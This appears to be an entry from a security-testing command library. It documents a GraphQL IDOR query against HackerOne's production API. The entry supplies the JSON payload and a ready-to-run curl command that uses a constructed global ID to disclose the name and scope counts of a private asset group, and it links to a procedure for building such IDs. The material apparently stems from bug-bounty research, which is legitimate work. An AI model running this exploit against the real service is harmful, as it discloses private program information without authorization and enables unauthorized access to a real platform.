---
data: >-
  {"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){...
  on
  PolicyPageAssetGroupDocument{id,name,in_scope_count,out_of_scope_count,structured_scopes_count}}}"}
tags:
  - graphql
  - idor
type: command
executor: bash
platforms:
  - Web
id: 98bbfcc9-afc5-42c2-8a19-3b1d494fde10
created_at: '2025-12-11T03:48:05.924Z'
updated_at: '2025-12-11T03:48:05.924Z'
verified: false
validated: true
submitted: true
---
# graphql-query-asset-group-details

## Command

```json
{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name,in_scope_count,out_of_scope_count,structured_scopes_count}}}"}
```

## Description

Queries a GraphQL node using a constructed GID to disclose detailed scope information of a private PolicyPageAssetGroup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id` | Constructed GID (e.g., 3981-41287) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" --data '{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name,in_scope_count,out_of_scope_count,structured_scopes_count}}}"}' https://hackerone.com/graphql
```

## Expected Output

JSON with node data including id, name, and scope counts.

## Related

- [[procedures/Construct-GID-and-Query-Private-Asset-Groups]]
